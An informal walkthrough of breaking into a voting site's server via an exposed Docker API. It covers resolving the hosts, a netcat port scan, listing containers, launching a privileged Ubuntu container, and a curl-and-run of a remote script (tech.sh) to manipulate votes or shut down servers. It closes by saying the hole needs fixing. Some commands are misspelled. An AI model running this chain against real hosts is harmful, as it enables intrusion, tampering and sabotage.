someone want to messup voting site (dog is winning over cat), more like manipulation she wants.
1. there is a vote.com and result.com, so she checks - 
ping www.vote.com - 104.21.63.124 .
ping www.result.com - 104.21.63.124 .
both ips respond with same IP which means they both are hosted in same infra.

2. then she scans the ports - 
nc -zv 104.21.63.124 1-1000 .
- nc (Netcat) → Used for network connections and port scanning.
- z → "Zero-I/O mode" (just checks if ports are open, doesn’t send data).

3. she gets docker port (docker api = 2375) open. this means infra runs as docker and this mean app most likely runs as container.

4. since docker is running and infra init, she tried - 
docker -H www.vote.com ps (list all runnning containers).
- she could do docker -H www.vote.com version 

5. now she could run as previllage conatiner using ubuntu - 
docker -H www.vote.com run --priviledge -it ubuntu bash (she is not in pri.. container on the server hosting this app ).

6. now she tried to inject script and for that she needs to download wget, then she can download bad script in this container.
- curl http://my.app.com/tech.sh > tech.sh .
- chmod +x tech.sh && ./tech.sh .

This way she can shutdown servers as well, so this vulnerability needs to be fixed.
